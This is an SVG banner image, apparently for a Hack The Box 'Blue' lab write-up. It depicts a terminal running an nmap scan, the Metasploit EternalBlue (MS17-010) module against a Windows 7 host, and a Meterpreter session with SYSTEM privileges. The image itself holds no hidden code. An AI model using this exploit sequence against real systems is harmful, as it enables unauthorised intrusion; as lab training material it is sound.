<svg xmlns="http://www.w3.org/2000/svg" width="800" height="450" viewBox="0 0 800 450">
  <defs>
    <linearGradient id="blueBg" x1="0" y1="0" x2="1" y2="1" gradientUnits="objectBoundingBox">
      <stop offset="0%" stop-color="#050b16"/>
      <stop offset="100%" stop-color="#0a1a2f"/>
    </linearGradient>
    <linearGradient id="badgeFill" x1="0" y1="0" x2="0" y2="1" gradientUnits="objectBoundingBox">
      <stop offset="0%" stop-color="#1d4ed8"/>
      <stop offset="100%" stop-color="#1e3a8a"/>
    </linearGradient>
    <filter id="glow" x="-40%" y="-40%" width="180%" height="180%">
      <feGaussianBlur in="SourceGraphic" stdDeviation="4.5" result="blur"/>
      <feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge>
    </filter>
  </defs>

  <rect width="800" height="450" fill="url(#blueBg)"/>

  <!-- Faint network / dot grid backdrop -->
  <g stroke="#1e3a8a" stroke-width="0.6" opacity="0.35">
    <line x1="0" y1="90" x2="800" y2="90"/>
    <line x1="0" y1="180" x2="800" y2="180"/>
    <line x1="0" y1="360" x2="800" y2="360"/>
    <line x1="200" y1="0" x2="200" y2="450"/>
    <line x1="600" y1="0" x2="600" y2="450"/>
  </g>

  <!-- Terminal window -->
  <rect x="40" y="52" width="720" height="300" rx="10" fill="#0b1424" stroke="#1e40af" stroke-width="1.2"/>
  <rect x="40" y="52" width="720" height="30" rx="10" fill="#122040"/>
  <rect x="40" y="67" width="720" height="15" fill="#122040"/>
  <circle cx="63" cy="67" r="5.5" fill="#ff5f57"/>
  <circle cx="81" cy="67" r="5.5" fill="#febc2e"/>
  <circle cx="99" cy="67" r="5.5" fill="#28c840"/>
  <text x="400" y="72" text-anchor="middle" fill="#5b7bb8" font-family="monospace" font-size="11">kali@attacker: ~/htb/blue</text>

  <!-- Terminal body -->
  <text x="58" y="110" fill="#5b7bb8" font-family="monospace" font-size="12">$ nmap -sC -sV -A 10.0.2.15</text>
  <text x="58" y="132" fill="#93c5fd" font-family="monospace" font-size="11.5">135/tcp  open  msrpc</text>
  <text x="58" y="150" fill="#93c5fd" font-family="monospace" font-size="11.5">139/tcp  open  netbios-ssn</text>
  <text x="58" y="168" fill="#93c5fd" font-family="monospace" font-size="11.5">445/tcp  open  microsoft-ds</text>
  <text x="58" y="190" fill="#60a5fa" font-family="monospace" font-size="11.5">OS: Windows 7 Ultimate SP1 (Build 7601)</text>
  <text x="58" y="208" fill="#f87171" font-family="monospace" font-size="11.5">message_signing: disabled (dangerous)</text>

  <text x="58" y="238" fill="#5b7bb8" font-family="monospace" font-size="12">$ msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue"</text>
  <text x="58" y="260" fill="#34d399" font-family="monospace" font-size="11.5">[+] VULNERABLE: ms17-010 (EternalBlue)</text>
  <text x="58" y="282" fill="#34d399" font-family="monospace" font-size="12" font-weight="bold" filter="url(#glow)">[+] Meterpreter session 1 opened</text>
  <text x="58" y="304" fill="#5b7bb8" font-family="monospace" font-size="11.5">meterpreter&gt; getuid</text>
  <text x="58" y="324" fill="#fbbf24" font-family="monospace" font-size="12" font-weight="bold">NT AUTHORITY\SYSTEM</text>
  <rect x="58" y="332" width="8" height="13" fill="#60a5fa" opacity="0.85"/>

  <!-- Badges row -->
  <rect x="40" y="378" width="150" height="34" rx="17" fill="url(#badgeFill)" opacity="0.9"/>
  <text x="115" y="400" text-anchor="middle" fill="#eff6ff" font-family="Inter,sans-serif" font-size="13" font-weight="700" letter-spacing="0.5">HTB · BLUE</text>

  <rect x="202" y="378" width="150" height="34" rx="17" fill="rgba(96,165,250,0.1)" stroke="#3b82f6" stroke-width="1"/>
  <text x="277" y="400" text-anchor="middle" fill="#93c5fd" font-family="Inter,sans-serif" font-size="12" font-weight="600">MS17-010</text>

  <rect x="364" y="378" width="170" height="34" rx="17" fill="rgba(96,165,250,0.1)" stroke="#3b82f6" stroke-width="1"/>
  <text x="449" y="400" text-anchor="middle" fill="#93c5fd" font-family="Inter,sans-serif" font-size="12" font-weight="600">EternalBlue</text>

  <rect x="546" y="378" width="150" height="34" rx="17" fill="rgba(96,165,250,0.1)" stroke="#3b82f6" stroke-width="1"/>
  <text x="621" y="400" text-anchor="middle" fill="#93c5fd" font-family="Inter,sans-serif" font-size="12" font-weight="600">First Box</text>

  <text x="760" y="400" text-anchor="end" fill="#3b5b96" font-family="monospace" font-size="10.5">CVE-2017-0143</text>
</svg>
